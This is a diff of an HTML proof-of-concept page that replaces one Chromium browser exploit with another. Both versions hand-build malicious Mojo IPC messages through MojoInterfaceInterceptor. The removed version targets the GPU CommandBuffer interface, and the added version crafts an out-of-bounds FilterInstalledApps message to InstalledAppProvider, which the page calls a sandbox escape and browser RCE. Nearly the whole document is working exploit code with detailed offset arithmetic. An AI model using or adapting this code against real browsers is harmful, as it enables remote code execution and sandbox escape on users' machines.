@@ -1,132 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Reliable GPU Crash – Two Methods</title>
+    <title>InstalledAppProvider Sandbox Escape PoC</title>
 </head>
 <body>
-    <h1>GPU RCE PoC</h1>
-    <pre id="log" style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;"></pre>
+    <h1>InstalledAppProvider OOB – Browser RCE</h1>
+    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
     <script>
-    (async function() {
-        const logEl = document.getElementById('log');
-        const log = (...args) => {
-            const msg = args.join(' ');
-            logEl.textContent += msg + '\n';
+    (async () => {
+        const log = (msg) => {
+            document.getElementById('log').textContent += msg + '\n';
             console.log(msg);
         };
 
-        // Helper: send the two malicious messages on a CommandBuffer handle
-        function sendExploit(handle) {
-            // Message 1: RegisterTransferBuffer (ordinal 4)
-            const payload1 = new ArrayBuffer(256);
-            const v1 = new DataView(payload1);
-            // Mojo header
-            v1.setUint32(0, 2, true);         // version
-            v1.setUint32(4, 0, true);         // flags
-            v1.setUint32(8, 4, true);         // ordinal = RegisterTransferBuffer
-            v1.setUint32(12, 0, true);        // request_id
-            // RegisterTransferBuffer params
-            v1.setUint32(16, 24, true);       // struct size
-            v1.setUint32(20, 0, true);        // version
-            v1.setInt32(24, 0x1234, true);    // buffer ID
-            v1.setUint32(28, 0, true);        // padding
-            v1.setBigInt64(32, BigInt(0x28), true); // pointer to offset 0x50
-            // Fake SharedMemoryRegion at 0x50
-            v1.setUint32(0x50, 24, true);
-            v1.setUint32(0x54, 0, true);
-            v1.setUint32(0x58, 0, true);      // handle index 0
-            v1.setUint32(0x5C, 0, true);
-            v1.setBigUint64(0x60, BigInt(0x1001), true); // 4097 bytes
-
-            const sharedBuffer = Mojo.createSharedBuffer(4096);
-            handle.writeMessage(payload1, [sharedBuffer.handle]);
-            log('[1] Sent RegisterTransferBuffer');
-
-            // Message 2: SetGetBuffer (ordinal 1)
-            const payload2 = new ArrayBuffer(32);
-            const v2 = new DataView(payload2);
-            v2.setUint32(0, 2, true);
-            v2.setUint32(4, 0, true);
-            v2.setUint32(8, 1, true);          // ordinal = SetGetBuffer
-            v2.setUint32(12, 0, true);
-            v2.setUint32(16, 16, true);        // struct size
-            v2.setUint32(20, 0, true);
-            v2.setInt32(24, 0x1234, true);     // buffer ID
-            handle.writeMessage(payload2, []);
-            log('[2] Sent SetGetBuffer');
-        }
-
         try {
-            // ---------- METHOD A: Intercept CommandBuffer ----------
-            if (typeof MojoInterfaceInterceptor !== 'undefined') {
-                log('MojoInterfaceInterceptor available, trying interception...');
-                let intercepted = false;
-                const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
-                interceptor.oninterfacerequest = (e) => {
-                    intercepted = true;
-                    interceptor.stop();
-                    log('Intercepted CommandBuffer!');
-                    const remote = new gpu.mojom.CommandBufferPtr(e.handle);
-                    sendExploit(remote.ptr.getHandle());
-                };
-                interceptor.start();
+            // Intercept the InstalledAppProvider pipe when it's created
+            const interceptor = new MojoInterfaceInterceptor(
+                'blink.mojom.InstalledAppProvider', 'process');
+            interceptor.oninterfacerequest = (e) => {
+                interceptor.stop();
+                const remote = new blink.mojom.InstalledAppProviderPtr(e.handle);
+                const pipe = remote.ptr.getHandle();
 
-                // Trigger command buffer creation via WebGL
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) throw new Error('WebGL not available');
-                log('WebGL context created, waiting 2s for interception...');
+                // Build malicious FilterInstalledApps message
+                const payload = new ArrayBuffer(256);
+                const v = new DataView(payload);
 
-                await new Promise(r => setTimeout(r, 2000));
-                if (intercepted) {
-                    log('Exploit sent via interception. GPU should crash now.');
-                    // Keep page alive
-                    setInterval(() => {}, 10000);
-                    return;
-                }
-                log('Interception did NOT fire. Falling back to direct method...');
-            } else {
-                log('MojoInterfaceInterceptor not defined. Using direct method...');
-            }
+                // Mojo message header (16 bytes)
+                v.setUint32(0, 2, true);          // version
+                v.setUint32(4, 0, true);          // flags
+                v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
+                v.setUint32(12, 0, true);         // request_id
 
-            // ---------- METHOD B: Direct bind to Gpu interface ----------
-            log('Using direct bind method...');
-            const provider = Mojo.getInterfaceProvider();
-            let gpuHandle, gpu;
-            try {
-                gpuHandle = Mojo.bindInterface('viz.mojom.Gpu', provider);
-                gpu = new viz.mojom.GpuPtr(gpuHandle);
-                log('Bound to viz.mojom.Gpu');
-            } catch (e) {
-                gpuHandle = Mojo.bindInterface('gpu.mojom.GpuChannel', provider);
-                gpu = new gpu.mojom.GpuChannelPtr(gpuHandle);
-                log('Bound to gpu.mojom.GpuChannel');
-            }
+                // FilterInstalledApps params:
+                // The vulnerable code reads from puVar1, which points to offset 16
+                // puVar1[1] at offset 20 (count)
+                v.setUint32(20, 2, true);          // count >= 2 → trigger offset path
+                // puVar1[8] at offset 24: relative offset (64-bit)
+                // We want to point to offset 0x40 inside the same buffer.
+                // The offset is relative to puVar1+8, so target = puVar1 + 8 + offset
+                // puVar1 = payload+16, so target = 16 + 8 + offset = 24 + offset
+                // To reach 0x40: offset = 0x40 - 24 = 0x1C
+                v.setBigInt64(24, BigInt(0x1C), true);
 
-            // Create a command buffer pipe
-            const {handle0: cmdHandle, handle1: cmdServer} = Mojo.createMessagePipe();
-            const {handle0: clientHandle, handle1: clientServer} = Mojo.createMessagePipe();
-            const sharedState = Mojo.createSharedBuffer(4096);
+                // Fake data at offset 0x40:
+                // The returned pointer = puVar1 + offset + 0x20 (since count>=2 and offset!=0)
+                // = (16) + 0x1C + 0x20 = 0x52? Let's calculate precisely:
+                // puVar1 = message+16. offset = 0x1C.
+                // pointer = puVar1 + offset + 0x20 = message + 16 + 0x1C + 0x20 = message + 0x52
+                // So we need fake data at 0x52. Let's put the array count there.
+                const targetArrayPtr = 0x52;
+                // At that location, we place a fake array length (e.g., 0x1000)
+                v.setUint32(targetArrayPtr, 0x1000, true);  // large array → overflow
 
-            const params = {
-                params: { streamId: 1, routeId: 1 },
-                sharedState: sharedState.handle,
-                receiver: cmdServer,
-                client: clientServer
+                // Send the raw message (no handles needed)
+                pipe.writeMessage(payload, []);
+                log('Malicious FilterInstalledApps sent!');
             };
+            interceptor.start();
 
-            await gpu.createCommandBuffer(params);
-            log('CommandBuffer created directly.');
+            // Trigger the renderer to request InstalledAppProvider
+            if (navigator.getInstalledRelatedApps) {
+                navigator.getInstalledRelatedApps().catch(() => {});
+                log('getInstalledRelatedApps called');
+            } else {
+                log('getInstalledRelatedApps not available');
+            }
 
-            // Now we have cmdHandle as the CommandBuffer remote
-            const cmdRemote = new gpu.mojom.CommandBufferPtr(cmdHandle);
-            sendExploit(cmdRemote.ptr.getHandle());
-
-            log('Exploit sent via direct bind. GPU should crash now.');
-            setInterval(() => {}, 10000);
-        } catch (err) {
-            log('ERROR:', err.message);
-            console.error(err);
+            await new Promise(r => setTimeout(r, 2000));
+            log('Done. If the browser doesn\'t crash, check the browser process.');
+        } catch (e) {
+            log('Error: ' + e.message);
         }
     })();
     </script>
